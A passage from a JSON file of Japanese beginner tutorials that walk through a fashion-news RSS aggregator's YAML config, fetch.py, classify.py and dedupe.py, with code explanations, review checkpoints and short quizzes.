   "body": "## 📄 解説するコード\n\n`config/sources.yaml`（抜粋）\n\n```yaml\nsources:\n  - {name: WWDJAPAN, url: \"https://www.wwdjapan.com/feed\", kind: media}\n  - {name: FASHIONSNAP, url: \"https://www.fashionsnap.com/rss.xml\", kind: media}\n  - name: Googleニュース(SNSで話題)\n    url: \"https://news.google.com/rss/search?q=...+when:1d&hl=ja&gl=JP&ceid=JP:ja\"\n    kind: sns\n  - {name: はてブ(ライフスタイル), url: \"https://b.hatena.ne.jp/hotentry/life.rss\", kind: sns, require_fashion: true}\n```\n\n`config/categories.yaml`（抜粋）\n\n```yaml\nmax_per_category: 20\nfashion_keywords: [ファッション, 服, コーデ, スニーカー, ブランド, ...]\nniche_category: 公式発表・ニッチ\nniche_kinds: [official, sns]\nfallback_category: その他\ncategories:\n  - name: ハイブランド/コレクション\n    keywords: [コレクション, ランウェイ, パリ, ミラノ, シャネル, ...]\n  - name: ストリート/スニーカー\n    keywords: [スニーカー, ストリート, コラボ, ナイキ, Nike, ...]\n  - name: 業界・ビジネス\n    keywords: [決算, 売上, 買収, 就任, ...]\n  - name: トレンド/スタイリング\n    keywords: [トレンド, 着こなし, コーデ, ...]\n```\n\n## 🧭 ひとことで言うと\n\n**YAML**（ヤムル）という形式で書かれた 2 つの設定ファイルです。`sources.yaml` は **ニュースを集める 8 つのサイトの一覧**、`categories.yaml` は **ジャンル分けのキーワード辞書と件数の上限** を決めています。\n\n## 🗺️ 全体の流れ\n\n1. `main.py` が起動時にこの 2 つを読み込み、Python の辞書・リストに変換する\n2. `sources` の一覧は `fetch.py` に渡され、上から順に RSS を取りに行く\n3. `categories.yaml` の内容は `classify.py` に渡され、記事のタイトルとキーワードを照らし合わせる\n\n## 🔍 ブロックごとの解説\n\n### YAML の読み方\n\nYAML は「人が読み書きしやすい JSON」のような形式です。Python に読み込むと、そのまま辞書とリストになります。\n\n| YAML | 意味 | Python では |\n|---|---|---|\n| `max_per_category: 20` | キー: 値 | `{\"max_per_category\": 20}` |\n| `- name: ...`（行頭の `-`） | リストの 1 項目 | `[ {...}, {...} ]` |\n| `[ファッション, 服]` | 1 行で書いたリスト | `[\"ファッション\", \"服\"]` |\n| `{name: WWDJAPAN, url: ...}` | 1 行で書いた辞書 | `{\"name\": \"WWDJAPAN\", \"url\": ...}` |\n| `# ...` | コメント | `# ...` |\n| インデント（字下げ） | 入れ子の関係 | Python と同じく字下げが意味を持つ |\n\n`sources.yaml` では 1 行で書く書き方と、複数行で書く書き方が混ざっていますが、**どちらも同じ辞書** です。URL が長いものだけ複数行にして読みやすくしています。\n\n### sources.yaml：情報源の一覧\n\n| 項目 | 意味 |\n|---|---|\n| `name` | 表示用の名前（Notion に「— WWDJAPAN」のように出る） |\n| `url` | RSS の URL |\n| `kind` | `media`（メディア）/ `sns`（SNS の話題）など。`sns` は「公式発表・ニッチ」ジャンルに入る |\n| `require_fashion: true` | ファッションと関係ない記事も混ざる情報源用。タイトルにファッション系のキーワードがある記事だけ残す |\n\nGoogle ニュースの URL の `q=%E3%83%95...` は、日本語の検索キーワード（「ファッション コレクション」など）を URL 用に変換したものです。`when:1d` は「直近 1 日」の意味です。\n\n### categories.yaml：仕分けのルール\n\n- **上から順に判定し、最初に当たったジャンルに入れる**。「パリでスニーカーのコラボ」は「パリ」が先に当たるので「ハイブランド/コレクション」になる\n- `kind` が `sns` か `official` の記事は、キーワードに関係なく **先に「公式発表・ニッチ」** に入る\n- どこにも当たらなければ「その他」\n- `max_per_category: 20`：各ジャンル最大 20 件\n\n## 🐍 Python と比べると\n\n`main.py` ではこう読み込んでいます。\n\n```python\nimport yaml\nconfig = yaml.safe_load(open(\"config/categories.yaml\", encoding=\"utf-8\"))\nconfig[\"max_per_category\"]            # 20\nconfig[\"categories\"][0][\"name\"]       # \"ハイブランド/コレクション\"\n```\n\n`yaml.safe_load` は JSON の `json.loads` にあたります。`safe_` が付いているのは、YAML の危険な機能（プログラムを実行させる書き方）を無効にした **安全な読み込み方** だからです。\n\n## 🔑 キーワード\n\n- **YAML**：設定ファイルでよく使われる、字下げで構造を表すデータ形式（GitHub Actions の設定も YAML）\n- **設定ファイル**：プログラムの動きを、コードを変えずに調整するためのファイル\n- **キーワード辞書**：ジャンルごとに「この言葉があればこのジャンル」と決めた一覧\n- **URL エンコード**：日本語などを `%E3%83...` の形にして URL に入れられるようにすること\n- **safe_load**：YAML を安全に読み込む関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 情報源とキーワードをコードから切り離していて、変更しやすい\n- ✅ コメントで「上から順に判定」「URL は未確認なので初回のログを見ること」と注意点が書かれている\n- ⚠️ 「上から順に最初の 1 つ」なので、**キーワードの並び順で結果が変わる**。「コラボ」を含むハイブランドの記事は、ハイブランドの方に入る\n- ⚠️ 「人気」「秋冬」のような広い言葉は、ファッション以外の記事も拾いやすい（ただし情報源がファッション系なので実害は小さい）\n- ⚠️ 英語キーワードは大文字・小文字を区別しない（`classify.py` で小文字にそろえている）が、全角・半角の違いはそろえていない\n\n## 🗣️ 30 秒で人に説明するなら\n\n「config フォルダには YAML の設定ファイルが 2 つあります。sources.yaml はニュースを集めるサイトの RSS 一覧で、種類やファッション記事だけに絞るかどうかも書けます。\ncategories.yaml はジャンル分けのキーワード辞書で、上から順にタイトルと照らし合わせて最初に当たったジャンルに入れます。\nコードを触らずに、情報源やキーワードを増やせるのがポイントです。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "YAML の `- {name: A, url: B}` を Python で読み込むと？",
      "choices": [
       "文字列 \"name: A, url: B\"",
       "辞書 {\"name\": \"A\", \"url\": \"B\"} を 1 つ含むリスト",
       "タプル (\"A\", \"B\")"
      ],
      "answer": 1,
      "explain": "行頭の - はリストの項目、{ } は辞書です。"
     },
     {
      "question": "タイトル「ミラノで話題のスニーカーコラボ」はどのジャンルになる？（kind は media）",
      "choices": [
       "ハイブランド/コレクション",
       "ストリート/スニーカー",
       "その他"
      ],
      "answer": 0,
      "explain": "上から順に判定するので、先にある「ミラノ」に当たります。"
     },
     {
      "question": "`require_fashion: true` が付いた情報源の記事はどうなる？",
      "choices": [
       "すべて「公式発表・ニッチ」に入る",
       "タイトルにファッション系のキーワードがある記事だけ残る",
       "必ず 20 件まで載る"
      ],
      "answer": 1,
      "explain": "はてブのように話題が幅広い情報源から、ファッション記事だけを残すための設定です。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-03-config"
  },
  {
   "title": "fetch.py ― ニュースサイトの RSS を取ってくる「仕入れ担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 4,
   "concepts": [
    "http_api",
    "data_formats",
    "errors",
    "functions",
    "loops"
   ],
   "lessons": [
    "10-python/05-functions",
    "10-python/07-exceptions",
    "10-python/03-loops",
    "10-python/08-modules"
   ],
   "summary": "8 つのサイトから RSS を取ってきて Article のリストにする。1 つ失敗しても他は続ける。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/fetch.py`\n\n```python\nfrom __future__ import annotations\n\nimport calendar\nimport logging\nfrom datetime import datetime, timezone\n\nimport feedparser\nimport requests\n\nfrom .models import Article\n\nlog = logging.getLogger(__name__)\nUSER_AGENT = \"fashion-news-bot/1.0 (personal RSS reader)\"\n\n\ndef parse_feed(content: bytes | str, source: str, kind: str) -> list[Article]:\n    parsed = feedparser.parse(content)\n    articles: list[Article] = []\n    for e in parsed.entries:\n        title = (e.get(\"title\") or \"\").strip()\n        link = (e.get(\"link\") or \"\").strip()\n        if not title or not link:\n            continue\n        ts = e.get(\"published_parsed\") or e.get(\"updated_parsed\")\n        published = (\n            datetime.fromtimestamp(calendar.timegm(ts), tz=timezone.utc) if ts else None\n        )\n        articles.append(Article(title, link, source, kind, published))\n    return articles\n\n\ndef fetch_source(src: dict, timeout: int = 20) -> list[Article]:\n    resp = requests.get(src[\"url\"], headers={\"User-Agent\": USER_AGENT}, timeout=timeout)\n    resp.raise_for_status()\n    return parse_feed(resp.content, src[\"name\"], src.get(\"kind\", \"media\"))\n\n\ndef fetch_all(sources: list[dict]) -> list[Article]:\n    \"\"\"1つの情報源が失敗しても他は続ける。\"\"\"\n    result: list[Article] = []\n    for src in sources:\n        try:\n            items = fetch_source(src)\n            log.info(\"%s: %d件\", src[\"name\"], len(items))\n            result.extend(items)\n        except Exception as exc:  # noqa: BLE001\n            log.warning(\"%s の取得に失敗: %s\", src[\"name\"], exc)\n    return result\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**各ニュースサイトの RSS をインターネットから取ってきて、記事（Article）のリストに変換する** ファイルです。3 つの関数が「全部 → 1 サイト → 中身の読み取り」と役割を分けています。\n\n## 🗺️ 全体の流れ\n\n1. `main.py` が `fetch_all(sources)` に情報源の一覧（8 サイト分）を渡す\n2. `fetch_all` が 1 サイトずつ `fetch_source` を呼ぶ\n3. `fetch_source` が `requests` で RSS をダウンロードし、`parse_feed` に渡す\n4. `parse_feed` が RSS の中身を 1 記事ずつ `Article` にする\n5. 全サイト分をまとめたリストを返す（失敗したサイトは飛ばして警告を出す）\n\n## 🔍 ブロックごとの解説\n\n### parse_feed：RSS の中身を Article にする\n\n```python\nparsed = feedparser.parse(content)\nfor e in parsed.entries:\n    title = (e.get(\"title\") or \"\").strip()\n```\n\n- `feedparser` は RSS を読み解いてくれる外部ライブラリ。`parsed.entries` が記事の一覧\n- `e.get(\"title\") or \"\"`：タイトルが無い・`None` のときは空文字にする。`.strip()` で前後の空白を取る\n- `if not title or not link: continue`：タイトルかリンクが空の記事は **飛ばす**（壊れたデータへの備え）\n\n```python\nts = e.get(\"published_parsed\") or e.get(\"updated_parsed\")\npublished = (\n    datetime.fromtimestamp(calendar.timegm(ts), tz=timezone.utc) if ts else None\n)\n```\n\n- 公開日時が無ければ更新日時を使う（`or` で「左が無ければ右」）\n- `feedparser` の日付は特殊な形なので、`calendar.timegm` で数値にしてから、**UTC（世界標準時）** の `datetime` に変換している\n- 日付がどちらも無ければ `None`（1 行の if 式：`値 if 条件 else 別の値`）\n\n### fetch_source：1 サイト分をダウンロード\n\n```python\nresp = requests.get(src[\"url\"], headers={\"User-Agent\": USER_AGENT}, timeout=timeout)\nresp.raise_for_status()\n```\n\n- `User-Agent`：「私は fashion-news-bot です」と名乗る。サイトに対する **マナー**\n- `timeout=20`：20 秒応答が無ければ諦める（無いと永遠に待つことがある）\n- `raise_for_status()`：404 や 500 などのエラーなら例外を起こす\n- `src.get(\"kind\", \"media\")`：`kind` が書かれていなければ `media` 扱い\n\n### fetch_all：全サイトを回す。失敗しても止まらない\n\n```python\nfor src in sources:\n    try:\n        items = fetch_source(src)\n        result.extend(items)\n    except Exception as exc:\n        log.warning(\"%s の取得に失敗: %s\", src[\"name\"], exc)\n```\n\n`try / except` を **ループの中** に置いているのがポイントです。1 つのサイトが落ちていても、警告を出して次のサイトへ進みます。\n`result.extend(items)` は、リストに **リストの中身を全部** 足す（`append` だとリストごと 1 つの要素として入ってしまう）。\n\n### logging：記録を残す\n\n`print` の代わりに `log.info(...)` や `log.warning(...)` を使っています。GitHub Actions の実行ログに「WWDJAPAN: 30件」のように残るので、あとから「どのサイトが取れていないか」を確認できます。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `x or \"\"` | x が None や空なら \"\" を使う。「デフォルト値」の定番 |\n| `continue` | その記事だけ飛ばして次へ |\n| `except Exception` | ほぼすべてのエラーを受け止める。普通は避けたいが、ここは **ログを残して** 次に進むので妥当 |\n| `# noqa: BLE001` | 「広すぎる except だと警告するツールに、わざとだと伝える」ためのコメント |\n| `extend` と `append` | `[1].extend([2,3])` → `[1,2,3]`、`[1].append([2,3])` → `[1,[2,3]]` |\n\n## 🔑 キーワード\n\n- **RSS**：サイトの新着記事の一覧を機械向けに配る形式\n- **feedparser**：RSS を読み解く外部ライブラリ\n- **requests**：Web からデータを取ってくる外部ライブラリ\n- **User-Agent**：アクセスするときの「名札」\n- **タイムアウト**：一定時間応答が無ければ諦める仕組み\n- **UTC**：世界標準時。日本時間は UTC＋9 時間\n- **logging**：プログラムの動きを記録する標準ライブラリ\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ タイムアウト、ステータスのチェック、User-Agent の明示と、通信まわりが丁寧\n- ✅ 1 サイトの失敗で全体が止まらない\n- ✅ タイトルやリンクが無い壊れた記事を飛ばしている\n- ⚠️ サイトを 1 つずつ順番に取りに行くので、遅いサイトがあると全体も遅くなる（最大 20 秒 × 8 サイト）。今の規模なら問題なし\n- ⚠️ 全サイトの取得に失敗したときは、`main.py` 側でエラー終了するようになっている（このファイル単体では空のリストを返すだけ）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「fetch.py はニュースの仕入れ担当です。設定ファイルにある 8 つのサイトの RSS を requests で順番にダウンロードして、feedparser で読み解き、タイトル・URL・公開日時を Article にして返します。\nタイムアウトや User-Agent も付けていて、どこか 1 サイトが失敗しても警告をログに出して他のサイトは続けます。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "3 つ目のサイトの取得でエラーが起きた。4 つ目以降はどうなる？",
      "choices": [
       "プログラム全体が止まる",
       "警告をログに出して、4 つ目以降も取りに行く",
       "1 つ目からやり直す"
      ],
      "answer": 1,
      "explain": "try / except がループの中にあるので、失敗はそのサイトだけで済みます。"
     },
     {
      "question": "`e.get(\"published_parsed\") or e.get(\"updated_parsed\")` の意味は？",
      "choices": [
       "公開日時があればそれを、無ければ更新日時を使う",
       "両方の日時を足す",
       "両方そろっていないとエラー"
      ],
      "answer": 0,
      "explain": "or は「左が無い（None など）なら右」という意味で使われています。"
     },
     {
      "question": "`timeout=20` を付けない場合に起こりうる問題は？",
      "choices": [
       "記事が 20 件に制限される",
       "応答しないサイトがあると、いつまでも待ち続ける",
       "RSS が読めなくなる"
      ],
      "answer": 1,
      "explain": "requests は既定ではタイムアウトしないので、明示するのが定番です。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-04-fetch"
  },
  {
   "title": "classify.py ― タイトルのキーワードでジャンルに分ける「仕分け担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 5,
   "concepts": [
    "conditionals",
    "loops",
    "collections",
    "strings",
    "functions"
   ],
   "lessons": [
    "10-python/02-conditionals",
    "10-python/03-loops",
    "10-python/09-comprehensions-lambda",
    "10-python/06-strings"
   ],
   "summary": "記事のタイトルに含まれるキーワードでジャンルを決め、ファッションと関係ない記事を取り除く。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/classify.py`\n\n```python\nfrom __future__ import annotations\n\nfrom .models import Article\n\n\ndef classify(article: Article, config: dict) -> str:\n    if article.kind in config.get(\"niche_kinds\", []):\n        return config[\"niche_category\"]\n    text = article.title.lower()\n    for cat in config[\"categories\"]:\n        if any(k.lower() in text for k in cat[\"keywords\"]):\n            return cat[\"name\"]\n    return config[\"fallback_category\"]\n\n\ndef category_order(config: dict) -> list[str]:\n    return (\n        [c[\"name\"] for c in config[\"categories\"]]\n        + [config[\"niche_category\"], config[\"fallback_category\"]]\n    )\n\n\ndef is_fashion(article: Article, config: dict) -> bool:\n    text = article.title.lower()\n    return any(k.lower() in text for k in config.get(\"fashion_keywords\", []))\n\n\ndef apply_source_filters(articles: list[Article], sources: list[dict], config: dict) -> list[Article]:\n    strict = {s[\"name\"] for s in sources if s.get(\"require_fashion\")}\n    return [a for a in articles if a.source not in strict or is_fashion(a, config)]\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**記事のタイトルに含まれるキーワードを見て、ジャンル（ハイブランド・スニーカーなど）を決める** ファイルです。AI は使わず、`categories.yaml` の辞書との単純な照らし合わせ（ルールベース）で分けています。\n\n## 🗺️ 全体の流れ\n\n1. `apply_source_filters`：`require_fashion` の情報源から来た記事のうち、ファッションと関係ないものを取り除く\n2. `classify`：1 記事ごとにジャンル名を決める\n3. `category_order`：Notion に並べるジャンルの順番を作る\n\n## 🔍 ブロックごとの解説\n\n### classify：ジャンルを 1 つ決める\n\n```python\nif article.kind in config.get(\"niche_kinds\", []):\n    return config[\"niche_category\"]\n```\n\nまず情報源の種類を見ます。`sns` か `official` なら、キーワードに関係なく **「公式発表・ニッチ」で即決** です。`return` した時点で関数は終わります。\n\n```python\ntext = article.title.lower()\nfor cat in config[\"categories\"]:\n    if any(k.lower() in text for k in cat[\"keywords\"]):\n        return cat[\"name\"]\nreturn config[\"fallback_category\"]\n```\n\n- `.lower()`：英字を小文字にそろえる。「Nike」も「NIKE」も「nike」として比べられる\n- `for cat in ...`：ジャンルを **上から順に** 調べる\n- `any(k.lower() in text for k in cat[\"keywords\"])`：「キーワードのうち **どれか 1 つでも** タイトルに含まれていれば True」\n- 当たった時点で `return` するので、**最初に当たったジャンル 1 つ** に決まる\n- 最後まで当たらなければ「その他」\n\n### any(...) の読み方\n\n```python\nany(k.lower() in text for k in cat[\"keywords\"])\n```\n\nこれは次の for 文と同じ意味です。\n\n```python\nfound = False\nfor k in cat[\"keywords\"]:\n    if k.lower() in text:\n        found = True\n        break\n```\n\n`any` は「1 つでも True があれば True」、`all` は「全部 True なら True」。AI のコードで頻出の短い書き方です。\n\n### category_order：並べる順番\n\n```python\n[c[\"name\"] for c in config[\"categories\"]] + [config[\"niche_category\"], config[\"fallback_category\"]]\n```\n\nリスト内包表記で 4 つのジャンル名を取り出し、最後に「公式発表・ニッチ」「その他」を足しています。Notion のページはこの順に見出しが並びます。\n\n### apply_source_filters：ファッションと関係ない記事を除く\n\n```python\nstrict = {s[\"name\"] for s in sources if s.get(\"require_fashion\")}\nreturn [a for a in articles if a.source not in strict or is_fashion(a, config)]\n```\n\n- `strict`：`require_fashion: true` が付いた情報源の名前の **セット**（`{ }` の内包表記はセットになる）\n- 残す条件：「厳しくしない情報源から来た記事」**または**「ファッション系のキーワードを含む記事」\n- はてなブックマークのように話題が幅広い情報源だけ、ファッション記事に絞り込むしくみ\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `\"コレクション\" in text` | 文字列の中に含まれるか（部分一致）。「コレクションズ」でも当たる |\n| `config.get(\"niche_kinds\", [])` | キーが無ければ空のリスト。設定の書き忘れでも止まらない |\n| `{... for s in sources}` | `[ ]` ならリスト、`{ }` ならセット（重複なし・`in` の判定が速い） |\n| `return` を途中に書く | 当たった時点で即終了。「早期リターン」と呼ばれる読みやすい書き方 |\n\n## 🔑 キーワード\n\n- **ルールベース**：決めたルール（キーワード辞書）で判断する方式。AI を使う方式との対比\n- **any / all**：「どれか 1 つ」「全部」を判定する組み込み関数\n- **部分一致**：文字列の一部に含まれているかで判定すること\n- **セット（set）**：重複を持たない入れ物。`in` の判定が速い\n- **早期リターン**：条件が決まった時点で関数を抜ける書き方\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 関数が小さく、それぞれテストされている（10 ページ目）\n- ✅ 大文字・小文字の違いを吸収している\n- ⚠️ 部分一致なので、意図しない記事にも当たる。例：キーワード「パリ」は「パリッと焼けたパン」にも当たる\n- ⚠️ 1 記事 1 ジャンルなので、要件定義書の「複数ジャンルを付けてよい」とは違う\n- ⚠️ 全角・半角（「ＮＩＫＥ」と「NIKE」）は同じ扱いにならない。`dedupe.py` で使っている `unicodedata.normalize(\"NFKC\", ...)` を使えばそろえられる\n\n## 🗣️ 30 秒で人に説明するなら\n\n「classify.py は記事の仕分け担当です。SNS や公式発表から来た記事はまず『公式発表・ニッチ』に入れて、それ以外はタイトルにキーワード辞書の言葉が含まれるかを上から順に調べ、最初に当たったジャンルに入れます。\nどれにも当たらなければ『その他』です。はてブのような幅広い情報源は、ファッション系の言葉を含む記事だけ残すフィルターもかけています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`any(k in \"nikeの新作\" for k in [\"adidas\", \"nike\"])` の結果は？",
      "choices": [
       "True",
       "False",
       "\"nike\""
      ],
      "answer": 0,
      "explain": "\"nike\" が含まれているので、1 つでも当たれば True です。"
     },
     {
      "question": "kind が sns の記事「ナイキの新作スニーカー」のジャンルは？",
      "choices": [
       "ストリート/スニーカー",
       "公式発表・ニッチ",
       "その他"
      ],
      "answer": 1,
      "explain": "種類（kind）の判定がキーワードより先に行われます。"
     },
     {
      "question": "`{s[\"name\"] for s in sources}` が作るのは？",
      "choices": [
       "リスト",
       "辞書",
       "セット"
      ],
      "answer": 2,
      "explain": "{ } の内包表記で「キー: 値」の形でなければセットになります。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-05-classify"
  },
  {
   "title": "dedupe.py ― 古い記事・同じ記事を取り除く「検品担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 6,
   "concepts": [
    "strings",
    "collections",
    "loops",
    "functions"
   ],
   "lessons": [
    "10-python/06-strings",
    "10-python/04-lists-and-dicts",
    "10-python/09-comprehensions-lambda",
    "10-python/05-functions"
   ],
   "summary": "URL とタイトルを「比べやすい形」に整えてから、古い記事・掲載済みの記事・ほぼ同じ記事を除く。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/dedupe.py`\n\n```python\nfrom __future__ import annotations\n\nimport re\nimport unicodedata\nfrom datetime import datetime, timedelta\nfrom difflib import SequenceMatcher\nfrom urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit\n\nfrom .models import Article\n\n_TRACKING = re.compile(r\"^(utm_|fbclid|gclid|ref$|ref_)\")\n\n\ndef normalize_url(url: str) -> str:\n    p = urlsplit(url.strip())\n    query = [(k, v) for k, v in parse_qsl(p.query) if not _TRACKING.match(k)]\n    path = p.path.rstrip(\"/\") or \"/\"\n    return urlunsplit((p.scheme.lower(), p.netloc.lower(), path, urlencode(query), \"\"))\n\n\ndef normalize_title(title: str) -> str:\n    t = unicodedata.normalize(\"NFKC\", title).lower()\n    t = re.sub(r\"\\s+[-–|｜]\\s+[^-–|｜]+$\", \"\", t)  # 末尾の「 - 媒体名」を除く\n    return re.sub(r\"[\\W_]+\", \"\", t)\n\n\ndef filter_recent(articles: list[Article], now: datetime, hours: int = 36) -> list[Article]:\n    \"\"\"日付のない記事は残す（重複除去に任せる）。\"\"\"\n    cutoff = now - timedelta(hours=hours)\n    return [a for a in articles if a.published is None or a.published >= cutoff]\n\n\ndef dedupe(\n    articles: list[Article], seen_urls: set[str], similarity: float = 0.9\n) -> list[Article]:\n    kept: list[Article] = []\n    kept_titles: list[str] = []\n    for a in articles:\n        url = normalize_url(a.url)\n        if url in seen_urls:\n            continue\n        nt = normalize_title(a.title)\n        if not nt:\n            continue\n        if any(nt == t or SequenceMatcher(None, nt, t).ratio() >= similarity for t in kept_titles):\n            continue\n        kept.append(a)\n        kept_titles.append(nt)\n        seen_urls = seen_urls | {url}\n    return kept\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**同じニュースが何度も載らないようにする** ファイルです。URL とタイトルを「比べやすい形」に整えてから、古い記事・掲載済みの記事・タイトルがほぼ同じ記事を取り除きます。このシリーズで一番むずかしいファイルなので、ゆっくり読みましょう。\n\n## 🗺️ 全体の流れ\n\n1. `filter_recent`：36 時間より前の記事を取り除く\n2. `dedupe`：1 記事ずつ見て、次のどれかに当たれば捨てる\n   - URL が過去に載せたもの（`seen_urls`）に入っている\n   - タイトルが空\n   - すでに残した記事とタイトルが 90% 以上似ている\n3. 比べる前に、`normalize_url` と `normalize_title` で「表記ゆれ」をそろえる\n\n## 🔍 ブロックごとの解説\n\n### なぜ「そろえる（正規化）」が必要？\n\n同じ記事でも、URL やタイトルの書き方が少し違うことがよくあります。\n\n| 同じ記事なのに… | 例 |\n|---|---|\n| URL に追跡用の文字がついている | `https://ex.com/a?utm_source=x` と `https://ex.com/a` |\n| 最後の `/` の有無 | `https://ex.com/a/` と `https://ex.com/a` |\n| タイトルの後ろに媒体名 | `新作スニーカー発売 - 某メディア` と `新作スニーカー発売` |\n| 全角・半角、大文字・小文字 | `ＮＩＫＥ` と `nike` |\n\nそのまま比べると「別の記事」と判定されてしまうので、**比べる前に同じ形に整える** のが正規化です。\n\n### normalize_url：URL を整える\n\n```python\np = urlsplit(url.strip())\nquery = [(k, v) for k, v in parse_qsl(p.query) if not _TRACKING.match(k)]\npath = p.path.rstrip(\"/\") or \"/\"\nreturn urlunsplit((p.scheme.lower(), p.netloc.lower(), path, urlencode(query), \"\"))\n```\n\n1. `urlsplit`：URL を「https」「ex.com」「/a/」「utm_source=x&id=1」などの部品に分ける\n2. `?` 以降の項目（クエリ）から、`utm_`・`fbclid` など **広告の追跡用の項目だけ** 取り除く\n3. 最後の `/` を取る（全部取れて空になったら `/` にする）\n4. 小文字にそろえて組み立て直す。最後の `\"\"` は `#top` のような **ページ内の位置（フラグメント）を捨てる** という意味\n\n例：`https://EX.com/a/?utm_source=x&id=1#top` → `https://ex.com/a?id=1`\n\n### 正規表現（re）の読み方\n\n```python\n_TRACKING = re.compile(r\"^(utm_|fbclid|gclid|ref$|ref_)\")\n```\n\n正規表現は「文字のパターン」を書くための小さな言語です。\n\n| 記号 | 意味 |\n|---|---|\n| `^` | 先頭から |\n| `( A \\| B )` | A または B |\n| `$` | そこで終わり |\n\nなので「`utm_` で始まる」「`fbclid` で始まる」「ちょうど `ref`」「`ref_` で始まる」のどれかに一致します。\n\n### normalize_title：タイトルを整える\n\n```python\nt = unicodedata.normalize(\"NFKC\", title).lower()\nt = re.sub(r\"\\s+[-–|｜]\\s+[^-–|｜]+$\", \"\", t)\nreturn re.sub(r\"[\\W_]+\", \"\", t)\n```\n\n1. `NFKC`：全角英数字を半角に、半角カナを全角に…と **文字の種類をそろえる**。そのあと小文字に\n2. 1 つ目の `re.sub`：末尾の「` - 媒体名`」を消す。`\\s+` は空白、`[-–|｜]` は区切り記号のどれか、`[^-–|｜]+$` は「区切り記号以外の文字が最後まで続く」\n3. 2 つ目の `re.sub`：記号・空白（`\\W` は「文字でも数字でもないもの」）を全部消す\n\n例：`新作スニーカー発売！ - 某メディア` → `新作スニーカー発売`\n\n### filter_recent：新しい記事だけ残す\n\n```python\ncutoff = now - timedelta(hours=hours)\nreturn [a for a in articles if a.published is None or a.published >= cutoff]\n```\n\n「今から 36 時間前」を境目にして、それより新しい記事を残します。**日付が無い記事は残す**（あとの重複チェックや掲載済みチェックに任せる）という判断です。\n要件では「直近 24 時間」ですが、少し余裕を持って 36 時間にしているようです（掲載済みチェックがあるので、重なっても二重には載りません）。\n\n### dedupe：重複を取り除く本体\n\n```python\nif any(nt == t or SequenceMatcher(None, nt, t).ratio() >= similarity for t in kept_titles):\n    continue\n```\n\n`SequenceMatcher(...).ratio()` は、2 つの文字列が **どれくらい似ているかを 0〜1 で返す** 標準ライブラリの機能です。0.9 以上なら「ほぼ同じ記事」として捨てます。\n別のサイトが同じニュースを少し違うタイトルで出していても、まとめられます。\n\n```python\nseen_urls = seen_urls | {url}\n```\n\n残した記事の URL も「見たもの」に足して、同じ実行の中で同じ URL が 2 回出ても捨てられるようにしています。`|` はセットの合体です。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `r\"...\"` | raw 文字列。`\\s` などの `\\` をそのまま正規表現に渡すため |\n| `re.compile(...)` | 正規表現を前もって準備しておく。何度も使うときに速い |\n| `p.path.rstrip(\"/\") or \"/\"` | 空文字になったら `/` を使う、という `or` の定番の使い方 |\n| `seen_urls = seen_urls \\| {url}` | 元のセットを変えずに **新しいセットを作る**。呼び出し元の `seen` を書き換えないための書き方 |\n| `_TRACKING` の先頭の `_` | 「このファイルの中だけで使う」という慣習 |\n\n## 🔑 キーワード\n\n- **正規化**：比べやすいように表記ゆれをそろえること\n- **正規表現**：文字のパターンを表す書き方（`re` モジュール）\n- **クエリ**：URL の `?` 以降の部分。`key=value` が `&` でつながる\n- **トラッキングパラメータ**：`utm_source` など、どこから来たかを計測するための追跡用の項目\n- **NFKC**：全角・半角などの文字の種類をそろえる Unicode の正規化方式\n- **類似度（ratio）**：2 つの文字列がどれだけ似ているかを 0〜1 で表した値\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 表記ゆれに丁寧に対処していて、テストもある（10 ページ目）\n- ✅ 呼び出し元のデータを書き換えないように作られている\n- ⚠️ 記事が増えると遅くなる：残した記事全部とタイトルを比べるので、記事数の 2 乗に比例して時間がかかる。今の規模（数百件）なら問題なし\n- ⚠️ 似ているけれど別のニュース（例：「〇〇 春夏コレクション発表」と「〇〇 秋冬コレクション発表」）が 90% 以上似ていると、片方が消える可能性がある\n- ⚠️ `seen_urls | {url}` は毎回セットをまるごと作り直すので少し無駄がある（`set.add` を使えば速いが、元のデータを守るために最初に一度コピーする必要がある）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「dedupe.py は同じニュースを二重に載せないための検品担当です。まず 36 時間より古い記事を落とし、URL は追跡用のパラメータや末尾のスラッシュを取って、タイトルは全角半角や記号、末尾の媒体名を取ってそろえます。\nそのうえで、過去に載せた URL や、すでに残したタイトルと 90% 以上似ている記事を捨てています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`normalize_url(\"https://Ex.com/news/?utm_source=x\")` の結果は？",
      "choices": [
       "https://Ex.com/news/?utm_source=x",
       "https://ex.com/news",
       "https://ex.com/news/"
      ],
      "answer": 1,
      "explain": "ドメインを小文字にし、utm_ の項目と末尾の / を取り除きます。"
     },
     {
